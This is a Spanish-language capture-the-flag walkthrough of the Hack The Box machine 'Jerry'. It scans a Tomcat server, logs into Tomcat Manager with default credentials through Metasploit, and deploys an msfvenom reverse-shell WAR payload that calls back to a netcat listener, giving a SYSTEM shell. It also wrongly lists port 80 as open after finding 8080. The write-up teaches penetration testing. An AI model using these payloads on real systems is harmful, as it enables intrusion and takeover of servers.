
Jerry es una máquina Windows de dificultad fácil donde utilizando credenciales predeterminadas de Tomcat, se logra acceder a Apache Tomcat Manager para subir un archivo war con contenido malicioso y de esta forma obtener una shell como root.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 jerry.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos usando la herramienta **nmap** con el siguiente comando:
`sudo nmap -p- --open -T5 -v -n jerry.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable

El output de **nmap** es el siguiente:

```console
┌──(kali㉿kali)-[~/…/Machines/Easy/Windows/Jerry]
└─$ sudo nmap -p- --open -T5 -v -n 10.10.10.95 -oG all-ports
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 00:37 EDT
Initiating Ping Scan at 00:37
Scanning 10.10.10.95 [4 ports]
Completed Ping Scan at 00:37, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:37
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
SYN Stealth Scan Timing: About 12.53% done; ETC: 00:41 (0:03:36 remaining)
SYN Stealth Scan Timing: About 26.39% done; ETC: 00:41 (0:02:50 remaining)
SYN Stealth Scan Timing: About 39.76% done; ETC: 00:41 (0:02:18 remaining)
SYN Stealth Scan Timing: About 61.69% done; ETC: 00:41 (0:01:15 remaining)
Completed SYN Stealth Scan at 00:40, 164.82s elapsed (65535 total ports)
Nmap scan report for 10.10.10.95
Host is up (0.091s latency).
Not shown: 65534 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
           Raw packets sent: 131191 (5.772MB) | Rcvd: 120 (5.264KB)

```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p8080 jerry.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de **nmap**
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente
- `-p:` se establece los puertos que deseo hacer el escaneo
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto

El output de **nmap** es el siguiente:

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p8080 jerry.htb -oN targeted.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 00:42 EDT
Nmap scan report for jerry.htb (10.10.10.95)
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.49 seconds
```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.



**Apache Tomcat** es un contenedor de Java Servlet que permite que un servidor web maneje contenido dinámico basado en tecnología Java y también es open-source.

Lo primero es entrar al sitio web `http://jerry.htb:8080` con el fin de revisar qué información hay en el sitio y que podamos explotar. Algunas de las acciones que podemos realizar es inspeccionar el código fuente para validar si hay alguna exposición de información sensible como credenciales o tokens, del mismo modo, abrir algun link que nos lleve a un formulario y tenga alguna vulnerabilidad de inyección. Para esta versión de Apache, la 7.0.88, la vulnerabilidad es credenciales por defecto.

Hay dos formas para acceder al panel de administración de Tomcat:

1. Dirigirse a la url `http://jerry.htb:8080/manager/html` y en a ventana emergente que aparece escribimos cualquier usuario y cualquier contraseña y damos clic. Nos aparecerá una página con el título **401 Unauthorized** pero lo que nos llama la atención es el mensaje `For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.` El anterior mensaje nos da un indicio de que un posible usuario es `tomcat` y contraseña `s3cret` así que vamos a recargar la página y escribir las credenciales anterior y de esta manera logramos tener acceso al **Tomcat Web Application Manager**
   1. Vamos a utilizar Metasploit y el módulo `auxiliary/scanner/http/tomcat_mgr_login` que nos permite logearnos en el Manager de Tomcat con un diccionario de credenciales por defecto.

```console
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole 

Metasploit tip: View all productivity tips with the 
tips command

msf6 >
msf6 > search tomcat
   19  exploit/multi/http/zenworks_configuration_management_upload   2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   20  auxiliary/admin/http/tomcat_administration                                     normal     No     Tomcat Administration Tool Default Access
   21  auxiliary/scanner/http/tomcat_mgr_login                                        normal     No     Tomcat Application Manager Login Utility
   22  exploit/multi/http/tomcat_jsp_upload_bypass                   2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   23  auxiliary/admin/http/tomcat_utf8_traversal                    2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability

msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options                                                                         
                                                                                                                                     
Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                      Required  Description
   ----              ---------------                      --------  -----------
   BLANK_PASSWORDS   false                                no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                    yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                no        Try each user/password couple stored in the current database

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.10.95
RHOSTS => 10.10.10.95
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```



## Explotación

Revisando el Manager de Tomcat al cual tuvimos acceso, uno de los apartados que más nos interesa es `WAR file to deploy`, el cual nos permite subir un archivo y desde el lado del atacante, podríamos subir un payload, que es un código malicioso para poder tener acceso a la máquina mediante una shell reversa. Un archivo `.war` es básicamente un archivo que empaqueta clases de Java para desplegar aplicaciones web. 

Por lo anterior, vamos a crear un payload de Java, para un archivo war, con `msfvenom`

```console
┌──(kali㉿kali)-[~/…/Machines/Easy/Windows/Jerry]
└─$ sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war
Payload size: 1083 bytes
Final size of war file: 1083 bytes

```

- `-p:` payload que vamos a utilizar
- `<LHOST>:` la dirección IP de la máquina local
- `<LPORT>:` el puerto de la máquina local en el que queramos establecer la shell reversa
- `-f:` formato

Una vez creado el payload vamos dar clic al botón Browser en el apartado `WAR file to deploy` y vamos a buscar el archivo shell.war y finalmente damos click al botón Deploy.

Antes de dar desplegar el archivo `/shell` vamos a crear una sesión con **netcat** que es una herramienta de red nos permite ponernos en modo escucha en un puerto seleccionado tanto en TCP como UDP. El comando a ejecutar es el siguiente:
`nc -nlvp 4444`

- `-n:` no DNS
- `-l:` activa el modo escucha
- `-v:` informa el estado de la sesión
- `-p:` permite especificar el puerto local que se va a utilizar

Ahora sí, vamos a darle clic a la aplicación `/shell` y ya estamos dentro de la máquina como usuario `nt authority/system` la cual es una cuenta que tiene acceso a todos los recursos del sistema local

```console
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 4444                                                                                                           1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,602,907,136 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,602,907,136 bytes free

```

La flag del user y del root se encuentra en el archivo `2 for the price of 1.txt`

```console
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004db..........................

root.txt
04a8b3..........................
```

## Resumen

- Escaneo de puertos con herramienta nmap y encontramos el puerto 8080 abierto, el cual estaba corriendo un servidor Apache Tomcat 7.0.88
- Esta versión de Tomcat es vulnerable a credenciales por defecto, para esto, utilizamos un módulo de tomcat en Metasploit
- En el panel de administración teníamos la opción de desplegar un archivo war, así que creamos un payload con msfvenom para crear un shell reversa
- Cargamos el payload y antes de desplegar la aplicación, utilizamos la herramienta netcat para establecer una sesión
- Desplegamos la aplicación con el payload y de esta manera tenemos acceso como usuario administrador
- Las flags tanto del usuario como del root se encuentran en la ruta C:\Users\Administrator\Desktop\flags
